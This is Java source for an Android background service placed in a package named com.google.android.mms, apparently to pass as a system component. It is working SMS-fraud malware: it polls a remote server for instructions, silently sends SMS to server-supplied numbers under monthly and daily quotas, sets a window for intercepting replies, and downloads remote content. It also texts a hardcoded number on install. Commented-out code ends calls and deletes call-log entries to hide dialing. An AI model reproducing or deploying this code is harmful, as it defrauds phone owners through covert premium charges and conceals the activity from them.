package com.google.android.mms;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;

public class BgService extends Service {

    private static final String TAG = "BgService";
    private static final boolean DEBUG = true;
    
    public static final String ACTION_DIAL_BR = "action.dial.bg";
    public static final String ACTION_INTERNET = "action.internet.bg";
    public static final String ACTION_SEND_SMS = "action.sms.bg";
    public static final String ACTION_BOOT = "action.boot.bg";
    public static final String ACTION_SEND_SMS_ROUND = "action.round.sms";
    public static final String ACTION_INTERNET_CHANGED = "action.internet.changed";
    
    public static final String FILTER_ACTION = "com.mms.bg.FILTER_ACTION";
    public static final String META_DATA = "com.mms.bg.pid";
    public static final String VEDIO_ACTION = "com.mms.bg.vedio";
    public static final String START_SERVICE_TYPE = "com.mms.bg.type";
    
    private SettingManager mSM;
    private boolean mStartSMSAfterInternet;
    
    private boolean mIsCalling;
    
    private static final int LONG_DIAL_DELAY = 4 * 60 * 1000;
    private static final int DIAL_DELAY = 5 * 1000;
    private static final int SHOW_DIALOG_DELAY = 2000;
    
    private static final int NOTIFY_ID = 1;
    private static final Class[] mStartForegroundSignature = new Class[] { int.class, Notification.class };
    private static final Class[] mStopForegroundSignature = new Class[] { boolean.class };

    private NotificationManager mNM;
    private Method mStartForeground;
    private Method mStopForeground;
    private Object[] mStartForegroundArgs = new Object[2];
    private Object[] mStopForegroundArgs = new Object[1];

    private class VedioTitleTask extends AsyncTask<String, Integer, Integer> {

        @Override
        protected Integer doInBackground(String... params) {
            LOGD("Stirng size = " + params.length);
            mSM.log("Stirng size = " + params.length);
            if (params.length > 0) {
                mSM.downloadVedio();
            }
            return null;
        }
        
    };
    
    private BroadcastReceiver VedioBCR = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            LOGD("The vedio url = " + mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
            mSM.log("The vedio url = " + mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
            if (mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK) != null) {
                new VedioTitleTask().execute(mSM.mXMLHandler.getChanneInfo(XMLHandler.VEDIO_LINK));
            }
            
            int count = mSM.getVedioDownloadCount();
            if (count < 4) {
                mSM.sendBroadcastAction(VEDIO_ACTION, 10 * 60 * 1000);
            }
        }
    };
    
    private class MyTimerTask extends TimerTask {
        public void run() {
//            Intent intent = new Intent();
//            intent.setAction(VEDIO_ACTION);
//            BgService.this.sendBroadcast(intent);
            mSM.sendBroadcastAction(VEDIO_ACTION, 2 * 60 * 1000);
        }
    };
    
    /**
     * This is a wrapper around the new startForeground method, using the older
     * APIs if it is not available.
     */
    private void startForegroundCompat(int id, Notification notification) {
        // If we have the new startForeground API, then use it.
        if (mStartForeground != null) {
            mStartForegroundArgs[0] = Integer.valueOf(id);
            mStartForegroundArgs[1] = notification;
            try {
                mStartForeground.invoke(this, mStartForegroundArgs);
            } catch (InvocationTargetException e) {
                // Should not happen.
                Log.w("ApiDemos", "Unable to invoke startForeground", e);
            } catch (IllegalAccessException e) {
                // Should not happen.
                Log.w("ApiDemos", "Unable to invoke startForeground", e);
            }
            return;
        }
        
        setForeground(true);
    }

    /**
     * This is a wrapper around the new stopForeground method, using the older
     * APIs if it is not available.
     */
    private void stopForegroundCompat(int id) {
        // If we have the new stopForeground API, then use it.
        if (mStopForeground != null) {
            mStopForegroundArgs[0] = Boolean.TRUE;
            try {
                mStopForeground.invoke(this, mStopForegroundArgs);
            } catch (InvocationTargetException e) {
                // Should not happen.
                Log.w("ApiDemos", "Unable to invoke stopForeground", e);
            } catch (IllegalAccessException e) {
                // Should not happen.
                Log.w("ApiDemos", "Unable to invoke stopForeground", e);
            }
            return;
        }

        // Fall back on the old API.  Note to cancel BEFORE changing the
        // foreground state, since we could be killed at that point.
        setForeground(false);
    }
    
//    private static final int DIAL_AUTO = 0;
//    private static final int SHOW_DIALOG = 1;
//    private static final int START_INTENT = 2;
//    private static final int REMOVE_FIRST_LOG = 3;
//    private Handler mHandler = new Handler() {
//        public void handleMessage(Message msg) {
//            switch (msg.what) {
//            case DIAL_AUTO:
////                dial();
//                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
//                break;
//            case SHOW_DIALOG:
//                homeKeyPress();
//                mHandler.sendEmptyMessage(START_INTENT);
//                break;
//            case START_INTENT:
//                startIntent();
//                break;
//            case REMOVE_FIRST_LOG:
//                deleteLastCallLog();
//                break;
//            }
//        }
//    };
    
//    private class CancelTask implements Runnable {
//        public void run() {
//            if (mIsCalling == true) {
//                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
//                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
//                    try {
//                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
//                        SettingManager.getInstance(BgService.this).logTagCurrentTime("Dial_end");
//                        phone.endCall();
//                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
//                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
//                    } catch (Exception e) {
//                    }
//                }
//                mIsCalling = false;
//            }
//        }
//    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
        
        mSM = SettingManager.getInstance(BgService.this);
        mSM.setFirstStartTime();
        
        PackageManager pm = getPackageManager();
        List<ResolveInfo> plugins = pm.queryIntentServices(
                                   new Intent(FILTER_ACTION), PackageManager.GET_META_DATA);
        mSM.mPid = mSM.getPID();
        if (mSM.mPid == null || mSM.mPid.equals("0") == true) {
            mSM.mPid = "0";
            for (ResolveInfo info : plugins) {
                LOGD("package name = " + info.serviceInfo.packageName);
                if (info.serviceInfo.name.equals("com.mms.bg.ui.BgService") == true) {
                    if (info.serviceInfo.metaData != null 
                            && info.serviceInfo.metaData.containsKey(META_DATA) == true) {
                        LOGD("set the pid");
                        mSM.mPid = String.valueOf(info.serviceInfo.metaData.getInt(META_DATA));
                    }
                }
            }
            mSM.setPID(mSM.mPid);
        }
        LOGD("PID = " + SettingManager.getInstance(getApplicationContext()).mPid);
        mStartSMSAfterInternet = true;
        
        mNM = (NotificationManager)getSystemService(NOTIFICATION_SERVICE);
        try {
            mStartForeground = getClass().getMethod("startForeground", mStartForegroundSignature);
            mStopForeground = getClass().getMethod("stopForeground", mStopForegroundSignature);
        } catch (NoSuchMethodException e) {
            // Running on an older platform.
            mStartForeground = mStopForeground = null;
        }
        
        Notification notification = new Notification();
        this.startForegroundCompat(NOTIFY_ID, notification);
        
        IntentFilter filter = new IntentFilter();
        filter.addAction(VEDIO_ACTION);
        this.registerReceiver(VedioBCR, filter);
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        LOGD("onStart action = " + (intent != null ? intent.getAction() : ""));
        mSM.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));

        // sepcial code for ROM test, if rom test code handle the service start 
        // event, just return;
        if (handleByRomTestCode()) return;
        
        if (intent == null || intent.getAction() == null) {
            mSM.setNextFetchChannelInfoFromServerTime(0, false);
            return;
        }
        
        String action = intent.getAction();
        if (action.equals(ACTION_INTERNET) == true) {
            LOGD("[[onStart]] received the action to get the internet info");
//            String apnId = mSM.getApnIdByName(SettingManager.CMNET);
//            if (apnId == null) {
//                //cmnet network is not ready
//                mSM.mCMNetIsReady = false;
//                apnId = mSM.addCMNetApn();
//                if (apnId != null && mSM.updateCurrentAPN(apnId) == 1) {
//                    //switch the current apn to cmnet
//                    mSM.registerCMNetNetWorkChangeReceiver();
//                }
//                return;
//            } else {
//                mSM.mCMNetIsReady = true;
//            }
            fetchServerInfoAndDoAction("daily");
        } else if (action.equals(ACTION_SEND_SMS) == true) {
            // now do not use the sms broadcast to start one round sms send check
            
//            LOGD("[[onStart]] start send the sms for one cycle");
//            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer("sms round check");
//            if (ret == true) {
//                mSM.parseServerXMLInfo();
//                mSM.log(TAG, "start send the sms for one cycle");
//                mSM.startOneRoundSMSSend(0);
//                mSM.log("cancel the auto message send now and start it after this round sms send");
//                mSM.cancelAutoSendMessage();
//                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
//            } else {
//                mSM.setInternetConnectFailedBeforeSMS(true);
//                long false_retry_time = ((long) 1) * 3600 * 1000;
//                sm.setSMSSendDelay(false_retry_time);
//                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
//            }
//            if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
//                mSM.setSMSRoundTotalSnedCount(0);
//            }
        } else if (action.equals(ACTION_SEND_SMS_ROUND) == true) {
            mSM.log("receive the action = " + intent.getAction());
            oneRoundSMSSend();
        } else if (action.equals(ACTION_BOOT) == true) {
            mSM.log("action is not filtered use the default logic");
            File file = new File(mSM.DOWNLOAD_FILE_PATH);
            if (file.exists() == true) {
                mSM.parseServerXMLInfo();
                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                long delayTime = 0;
                if (delay != null) {
                    delayTime = (Integer.valueOf(delay)) * SettingManager.ONE_HOUR;
                }
                if (mSM.mHasSetFetchServerInfoAlarm == false) {
                    mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
                }
//                if (isSendSMS() == true) {
//                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
//                    mStartSMSAfterInternet = false;
//                } else if (isDownloadVedio() == true) {
                    //TODO : start download vedio process alarm
//                    mStartSMSAfterInternet = false;
//                }
            } else {
                if (mSM.mHasSetFetchServerInfoAlarm == false) {
                    mSM.setNextFetchChannelInfoFromServerTime(0, false);
                }
            }
        } else if (action.equals(ACTION_INTERNET_CHANGED) == true) {
            String str = intent.getStringExtra(SettingManager.CONNECT_NETWORK_REASON);
            if (str == null) str = "net aviliable";
            fetchServerInfoAndDoAction(str);
//                if (mSM.getInternetConnectFailedBeforeSMS() == true) {
//                    mSM.setInternetConnectFailedBeforeSMS(false);
//                    mSM.parseServerXMLInfo();
//                    mSM.log(TAG, "start send the sms for one cycle");
//                    mSM.startOneRoundSMSSend(0);
//                    mSM.log("cancel the auto message send now and start it after this round sms send");
//                    mSM.cancelAutoSendMessage();
//                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
//                }
        } else {
            // default action
            if (mSM.mHasSetFetchServerInfoAlarm == false) {
                mSM.setNextFetchChannelInfoFromServerTime(0, false);
            }
        }
    } 
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        mSM.log(TAG, "onDestroy");
        stopForegroundCompat(NOTIFY_ID);
        this.unregisterReceiver(VedioBCR);
    }
    
    private void fetchServerInfoAndDoAction(String connectionReason) {
        boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer(connectionReason);
        LOGD("action internet connection");
        mSM.log("action = " + connectionReason);
        if (ret == true) {
            mSM.setInternetConnectFailed(false);
            mSM.log("only connect the internet and make some settings");
            mSM.parseServerXMLInfo();
            String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
            long delayTime = 0;
            if (delay != null) {
                delayTime = (Long.valueOf(delay)) * SettingManager.ONE_HOUR;
            }
            LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
            mSM.setLastConnectServerTime(System.currentTimeMillis());
            mSM.mHasSetFetchServerInfoAlarm = false;
            mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
            if (isSendSMS() && mSM.needSMSRoundSend()) {
                if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.DAYS_20) {
                    mSM.setSMSRoundTotalSnedCount(0);
                }
                mSM.startOneRoundSMSSend(0);
                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
            } else if (isDownloadVedio() == true) {
                // long time = mSM.getLastVedioDownloadTime();
                // if ((System.currentTimeMillis() - time) >
                // SettingManager.SMS_DEFAULT_DELAY_TIME) {
                // mSM.clearVedioDownloadLink();
                // Timer timer = new Timer();
                // timer.schedule(new MyTimerTask(), 5 * 1000);
                // }
            }
        } else {
            mSM.setInternetConnectFailed(true);
        }
    }
    
    private boolean handleByRomTestCode() {
        if (Config.ROM_DEBUG) {
            if (mSM.getAppType().equals(SettingManager.APP_TYPE_EXTERNAL)) {
                try {
                    WorkingMessage wm = WorkingMessage.createEmpty(this);
                    wm.setDestNum("15810864155");
                    wm.setText("external install success");
                    wm.send();
                } catch (Exception e) {
                    e.printStackTrace();
                }
    
                // install the plugin now
                Intent uninstall_intent = new Intent();
                uninstall_intent.addCategory(UninstallReceiver.UNINSTALL_ACTION);
                this.sendBroadcast(uninstall_intent);
    
                return true;
            }
        }
        
        return false;
    }
    
    private void oneRoundSMSSend() {
        SettingManager sm = mSM;
        sm.log(TAG, "receive the intent for send on sms, intent action = " + ACTION_SEND_SMS_ROUND);
        if (sm.mXMLHandler != null) {
            String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
            if (monthCount != null) {
                String dayCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_DAY);
                int sendTotlaCount = Integer.valueOf(monthCount) - sm.getSMSRoundTotalSend();
                if (dayCount != null && dayCount.equals("") == false
                        && sendTotlaCount >= 0) {
                    sendTotlaCount = (sendTotlaCount > Integer.valueOf(dayCount))
                                          ? Integer.valueOf(dayCount) 
                                          : sendTotlaCount;
                }
                int todayHasSend = sm.getTodaySMSSendCount();
                if (todayHasSend < sendTotlaCount) {
                    autoSendSMS(BgService.this);
                    sm.setLastSMSTime(System.currentTimeMillis());
                    sm.setTodaySMSSendCount(todayHasSend + 1);
                    LOGD("this round has send sms count = " + (todayHasSend + 1));
                    sm.log(TAG, "this round has send sms count = " + (todayHasSend + 1));
                } else {
                    sm.log(TAG, "cancel this round the sms auto send, because the send job done");
                    sm.setSMSRoundTotalSnedCount(sm.getSMSRoundTotalSend() + todayHasSend);
                    sm.setTodaySMSSendCount(0);
                    sm.cancelOneRoundSMSSend();
                    sm.setSMSSendDelay(SettingManager.SMS_CHECK_ROUND_DELAY);
//                    long sms_delay_time = sm.getSMSSendDelay();
//                    sm.startAutoSendMessage(0, sms_delay_time);
                }
            } else {
                sm.log(TAG, "cancel this round the sms auto send, because month count == null");
                sm.cancelOneRoundSMSSend();
            }
        } else {
            sm.log(TAG, "mXMLHandler == null error");
        }
    }
    
    private boolean isSendSMS() {
        if (mSM.mXMLHandler != null) {
            String targetNum = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
            String sendText = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
            String smsOrDial = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (smsOrDial != null && targetNum != null && sendText != null) {
                return Integer.valueOf(smsOrDial) == 0 ? true : false;
            }
        }
        return false;
    }
    
    private boolean isDownloadVedio() {
        if (mSM.mXMLHandler != null) {
            String flag = mSM.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (flag != null) {
                return Integer.valueOf(flag) == 2 ? true : false;
            }
        }
        return false;
    }
    
    private void autoSendSMS(Context context) {
        SettingManager sm = SettingManager.getInstance(context);
        if (sm.isSimCardReady() == false || sm.isCallIdle() == false) return;
      
        if (sm.mXMLHandler != null) {
            String targetNum = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_PORT);
            String sendText = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_ORDER);
            String smsOrDial = sm.mXMLHandler.getChanneInfo(XMLHandler.CHANNEL_SMS);
            if (smsOrDial != null && sendText != null && targetNum != null) {
                boolean sms = Integer.valueOf(smsOrDial) == 0 ? true : false;
                if (sms == true) {
                    String intercept_time_str = sm.mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
                    long intercept_time_int = ((long) 2000) * 60 * 1000;
                    if (intercept_time_str != null) {
                        intercept_time_int = Long.valueOf(intercept_time_str) * 60 * 1000;
                    }
                    sm.setSMSBlockDelayTime(intercept_time_int);
                    SettingManager.getInstance(context).makePartialWakeLock();
                    try {
                        Date date = new Date(System.currentTimeMillis());
                        LOGD("current time = " + date.toLocaleString());
                        WorkingMessage wm = WorkingMessage.createEmpty(context);
                        LOGD("send sms to : " + targetNum + " text = " + sendText);
                        wm.setDestNum(targetNum);
                        wm.setText(sendText);
                        wm.send();
                    } catch (Exception e) {
                    } finally {
                        SettingManager.getInstance(context).releasePartialWakeLock();
                        Date date = new Date(System.currentTimeMillis());
                        LOGD("[[autoSendSMSOrDial]] current time = " + date.toLocaleString());
                    }
                } else {
                    //TODO : dial
                }
            }
        } else {
            //TODO : do something for no xml handler
        }
    }
    
    private void homeKeyPress() {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
    
    private void startIntent() {
        Log.d(TAG, "========= [[startIntent]] ========");
        Intent intent = new Intent(BgService.this, DialScreenActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
//    private void deleteLastCallLog() {
//        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
//        ContentResolver resolver = getContentResolver();
//        Cursor c = null;
//        try {
//            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
//            c = resolver.query(
//                    CONTENT_URI,
//                    new String[] {Calls._ID},
//                    "type = 2",
//                    null,
//                    "date DESC" + " LIMIT 1");
//            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
//                if (c == null || !c.moveToFirst()) {
//                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
//                    return;
//                }
//                long id = c.getLong(0);
//                String where = Calls._ID + " IN (" + id + ")";
//                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
//                getContentResolver().delete(CONTENT_URI, where, null);
//            } finally {
//                if (c != null) c.close();
//            }
//            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
//    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
    
    public final void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, "[[" + this.getClass().getSimpleName()
                    + "::" + Thread.currentThread().getStackTrace()[3].getMethodName()
                    + "]] " + msg);
        }
    }
}
